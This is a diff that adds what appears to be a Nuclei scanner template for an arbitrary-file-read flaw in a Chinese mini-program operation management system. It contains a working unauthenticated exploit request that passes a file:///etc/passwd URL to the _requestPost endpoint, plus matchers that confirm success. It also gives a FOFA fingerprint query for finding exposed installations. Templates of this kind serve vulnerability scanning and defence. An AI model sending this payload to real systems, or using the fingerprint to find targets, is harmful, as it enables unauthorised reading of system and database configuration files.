@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 'root:'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/wxapps/_requestPost?data=1&url=file:///etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+id: wannengxiaochengxu-requestPost-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/com/css/head_foot.css" || body="/com/css/iconfont"
+        万能小程序运营管理系统 _requestPost 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 万能小程序运营管理系统 _requestPost 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487475&idx=1&sn=a53688e1a7bc7e3001c61a4e536c95c8&chksm=c267bac0f51033d68d38cf9b28c2dc8d883bb0024ce4b35ae5eecda96973f04f1b7da93fed8e&token=286085064&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
